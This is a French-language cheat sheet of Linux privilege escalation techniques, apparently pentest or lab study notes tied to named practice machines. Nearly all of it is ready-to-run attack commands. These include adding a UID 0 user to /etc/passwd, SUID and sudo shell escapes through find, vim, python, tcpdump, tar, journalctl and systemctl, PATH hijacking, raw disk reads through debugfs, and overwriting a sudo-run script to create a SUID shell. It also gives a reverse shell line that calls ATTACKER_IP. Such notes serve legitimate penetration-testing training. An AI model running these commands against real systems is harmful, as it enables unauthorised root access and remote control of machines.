# 03-Escalade Basée sur les Permissions

#### Permissions d'Écriture sur `/etc/passwd`
> Si le fichier `/etc/passwd` est modifiable, on peut ajouter un utilisateur avec UID 0 (root).

```bash
# Vérifier les permissions sur /etc/passwd
ls -l /etc/passwd

# Si modifiable :
# 1. Générer un mot de passe hashé
joe@debian-privesc:~$ openssl passwd -1 -salt newroot newpassword
# $1$newroot$qm9VBP3J3Y7A4hJkLpfMY. (Exemple de sortie)

# 2. Ajouter l'utilisateur au fichier /etc/passwd
# Format: username:password_hash:UID:GID:GECOS:home_directory:shell
echo "rootclone:\$1\$newroot\$qm9VBP3J3Y7A4hJkLpfMY.:0:0:root:/root:/bin/bash" >> /etc/passwd
# (Utiliser le hash généré précédemment)

# 3. Se connecter en tant que nouvel utilisateur root
joe@debian-privesc:~$ su rootclone
Password: newpassword # Entrer le mot de passe 'newpassword'
root@debian-privesc:/home/joe# id
# uid=0(root) gid=0(root) groups=0(root)
```

#### Binaires SUID/SGID
> Rechercher des binaires avec le bit SUID (Set User ID) ou SGID (Set Group ID). Un binaire SUID s'exécute avec les permissions du propriétaire du fichier (souvent root). Un binaire SGID s'exécute avec les permissions du groupe propriétaire.

```bash
# Trouver les binaires SUID (s'exécutent avec les permissions du propriétaire)
find / -perm -u=s -type f 2>/dev/null

# Trouver les binaires SGID (s'exécutent avec les permissions du groupe)
find / -perm -g=s -type f 2>/dev/null

# Combinaison pour les binaires appartenant à root avec SUID ou SGID
find / -user root \( -perm -4000 -o -perm -2000 \) -type f -exec ls -ldb {} \; 2>/dev/null
```
> **Exploitation de Binaires SUID/SGID Courants :**
> De nombreux exécutables standards, s'ils ont le bit SUID, peuvent être abusés pour obtenir un shell root.
> Consulter GTFOBins (https://gtfobins.github.io/) pour des techniques d'exploitation spécifiques.
> Exemples courants : `nmap` (ancienne version avec mode interactif), `find` (avec `-exec`), `cp`, `mv`, `tar`, `awk`, `perl`, `python`, `bash`, `more`, `less`, `vi`, `systemctl`, `journalctl`, `gdb`, etc.

```bash
# Exemple avec find (si SUID root)
# find . -exec /bin/sh -p \; -quit

# Exemple avec nmap (anciennes versions SUID)
# nmap --interactive
# nmap> !sh

# Exemple avec bash (si SUID root)
# bash -p
```

#### Abus des Droits Sudo
> Exploiter des configurations `sudo` permissives où un utilisateur peut exécuter des commandes en tant que root, potentiellement sans mot de passe ou avec des commandes qui permettent l'évasion.

```bash
# Vérifier les droits sudo de l'utilisateur courant
sudo -l
```
> Examiner attentivement la sortie pour les commandes exécutables sans mot de passe et les variables d'environnement conservées (`env_keep`).

##### Scénarios d'Exploitation Sudo :

*   **Scénario 1 (Sudo sans mot de passe pour des commandes "dangereuses") :** Si une commande comme `vim`, `nano`, `less`, `more`, `find`, `awk`, `sed`, `tar`, `cp`, `mv`, `python`, `perl`, `sh`, `bash`, etc., est exécutable sans mot de passe (`NOPASSWD`), chercher des moyens d'exécuter des commandes arbitraires via ces outils (GTFOBins est une excellente ressource).
    *   Exemple (via `vim`) : `sudo vim -c ':!/bin/sh'` ou `sudo vim -c ':set shell=/bin/bash :shell'`
    *   Exemple (via `find`) : `sudo find . -exec /bin/sh \; -quit`
    *   Exemple (via `python`) : `sudo python -c 'import os; os.system("/bin/bash")'`
*   **Scénario 2 (Sudo avec des chemins non standard / `secure_path`) :** Vérifier si le `PATH` utilisé par `sudo` (souvent défini par `secure_path` dans `/etc/sudoers`) est différent du `PATH` de l'utilisateur. Si `secure_path` est mal configuré ou si des commandes autorisées par `sudo` appellent d'autres exécutables sans chemin absolu, cela pourrait permettre d'exploiter des binaires malveillants portant le même nom que des commandes système si un répertoire inscriptible par l'utilisateur est dans le `secure_path` (rare mais possible) ou dans le `PATH` du script appelé.
    *   Vérifier le `PATH` de `sudo` : `sudo -l` (regarder la ligne `secure_path` ou `env_reset` et les `env_keep` associées au `PATH`). Comparer avec `echo $PATH`.
*   **Scénario 3 (Sudo avec des binaires vulnérables spécifiques) :** Rechercher des vulnérabilités spécifiques aux versions des binaires autorisés par `sudo`. Par exemple, une version spécifique de `apache2` autorisée par `sudo` pourrait avoir une vulnérabilité connue permettant l'escalade.

##### Sudo avec `(ALL) NOPASSWD: ALL` ou `(root) NOPASSWD: /chemin/commande`
> Si `sudo -l` indique `(ALL) NOPASSWD: ALL`, l'utilisateur peut exécuter n'importe quelle commande en tant que root sans mot de passe.
```bash
sudo su
# ou
sudo /bin/bash
```
> Si une commande spécifique est autorisée avec `NOPASSWD`, elle peut être utilisée directement. Si cette commande permet d'exécuter d'autres commandes (ex: `find`, `awk`, `less`), elle peut être exploitée.

##### Exploitation de `tcpdump` avec Sudo
> Si `sudo -l` autorise `tcpdump` et que l'utilisateur a les droits d'écriture dans le répertoire où `tcpdump` est exécuté.
```bash
# Condition : sudo -l montre que tcpdump peut être exécuté.
# L'option -w de tcpdump écrit dans un fichier. Si on peut contrôler le nom du fichier et que tcpdump est exécuté en tant que root...
# Cela est moins direct pour un shell, mais peut être utilisé pour écrire des fichiers.
# Une technique plus courante avec tcpdump (si version < 4.99.0) et l'option -z postrotate-command :
# Créez un script shell, par exemple /tmp/shell.sh
echo "/bin/bash -p" > /tmp/shell.sh
chmod +x /tmp/shell.sh
# Exécutez tcpdump avec l'option -z
sudo tcpdump -G 1 -w /tmp/dump -z /tmp/shell.sh
# Après 1 seconde, /tmp/shell.sh sera exécuté en tant que root.
```

##### Exploitation de `tar` avec Sudo
Exemple (Cockpit):
> Si `sudo -l` autorise `tar`.
```bash
# Vérifier les droits sudo
sudo -l
# Si /usr/bin/tar est autorisé :
sudo /usr/bin/tar -czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=/tmp/shell.sh .
# Ou pour un reverse shell :
# echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' > /tmp/shell.sh
# chmod +x /tmp/shell.sh
# sudo /usr/bin/tar -czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=/tmp/shell.sh .
```

##### Exploitation de `journalctl` avec Sudo
Exemple (Jordak):
> Si `sudo -l` autorise `journalctl`. `journalctl` utilise `less` par défaut pour afficher la sortie.
```bash
# Vérifier les droits sudo
sudo -l
# Si /usr/bin/journalctl est autorisé :
sudo /usr/bin/journalctl -n5 -unostromo.service
# Une fois dans l'interface de 'less', tapez :
!/bin/bash
# Ou !sh
```

##### Exploitation de `systemctl` avec Sudo
Exemple (Scrutiny):
> Si `sudo -l` autorise `systemctl`. `systemctl` peut aussi utiliser `less`.
```bash
# Vérifier les droits sudo
sudo -l
# Si systemctl est autorisé :
sudo systemctl # (ou une sous-commande qui pagine, ex: systemctl status some.service)
# Une fois dans l'interface de 'less', tapez :
!sh
```

#### Analyse des Permissions de Fichiers et Répertoires pour Manipulation
> Identifier les fichiers et répertoires avec des permissions d'écriture qui pourraient être abusées.

*   **Scénario 12 (Hijacking de binaires via répertoires inscriptibles dans le PATH) :** Si l'utilisateur a des permissions d'écriture dans un répertoire présent dans le `PATH` de `root` (ou utilisé par un service/script tournant en tant que `root`), il peut créer un fichier exécutable malveillant portant le même nom qu'une commande système. Lorsque le processus privilégié tentera d'exécuter cette commande sans chemin absolu, notre binaire malveillant sera exécuté.
    ```bash
    # Vérifier les permissions des répertoires dans le PATH de root (obtenu via `sudo -l` ou `sudo su -c 'echo $PATH'`)
    # Exemple: si /usr/local/bin est inscriptible et dans le PATH de root
    ls -ld /usr/local/bin
    # echo '/bin/bash -p' > /usr/local/bin/common_command
    # chmod +x /usr/local/bin/common_command
    # Attendre qu'un script root exécute 'common_command'
    ```
*   **Scénario 13 (Modification de fichiers privilégiés) :** Si un fichier de configuration appartenant à `root` (ou à un autre utilisateur privilégié) est modifiable par l'utilisateur actuel, il peut être altéré pour obtenir une élévation de privilèges.
    *   Exemple : Modifier `/etc/passwd` (déjà couvert, mais attention, très risqué et souvent détecté).
    *   Exemple : Modifier des scripts de démarrage de services (ex: dans `/etc/init.d/` ou fichiers unit systemd si modifiables).
    *   Exemple : Modifier des fichiers de configuration d'applications qui sont lus par des processus privilégiés (ex: `sudoers` lui-même si mal configuré, fichiers de configuration de `cron`).
    ```bash
    find /etc -type f -writable 2>/dev/null
    find /usr/sbin -type f -writable 2>/dev/null
    find /opt -type f -writable 2>/dev/null
    ```

#### Exploitation des Droits de Groupe
> L'appartenance à certains groupes peut accorder des privilèges indirects.

Exemple (Extplorer - groupe `disk`):
> Le groupe `disk` permet un accès brut aux périphériques de stockage.
```bash
# Vérifier les groupes de l'utilisateur
id

# Si membre du groupe 'disk':
# Lister les périphériques de blocs
lsblk
# Utiliser debugfs pour lire le contenu du système de fichiers (ex: /dev/sda1, /dev/mapper/...)
sudo debugfs /dev/mapper/ubuntu--vg-ubuntu--lv # Remplacer par le bon périphérique
# Dans debugfs:
# ls /root
# cat /root/proof.txt
# quit
```
> Autres groupes d'intérêt : `adm` (accès aux logs), `sudo` (droits sudo), `docker` (contrôle de Docker), `lxd` (contrôle de LXD), `shadow` (lecture de `/etc/shadow`), `staff`, `admin`.

#### Fichiers de Configuration Modifiables par des Processus Privilégiés
> Si un service exécuté en tant que root lit un fichier de configuration sur lequel vous avez des droits d'écriture, vous pourriez être capable d'influencer son comportement.
> (Cette section peut être étendue avec des exemples spécifiques si disponibles dans la documentation originale)

#### Fichiers de Scripts Modifiables Exécutés avec Sudo
> Si un script (Python, Bash, etc.) est exécuté avec `sudo` et que vous avez les droits d'écriture sur ce script, vous pouvez le modifier pour exécuter du code arbitraire en tant que root.

Exemple (BitForge, RubyDome - adapté de `05-linux-internals...`):
```bash
# Scénario : sudo -l montre que l'utilisateur peut exécuter /opt/scripts/maintenance.py
# sudo /opt/scripts/maintenance.py
# Vérifier les permissions sur /opt/scripts/maintenance.py
ls -l /opt/scripts/maintenance.py
# Si modifiable par l'utilisateur courant :
echo 'import os; os.system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash")' > /opt/scripts/maintenance.py
# Exécuter le script via sudo :
sudo /opt/scripts/maintenance.py
# Ensuite, exécuter le shell SUID :
/tmp/rootbash -p
``` 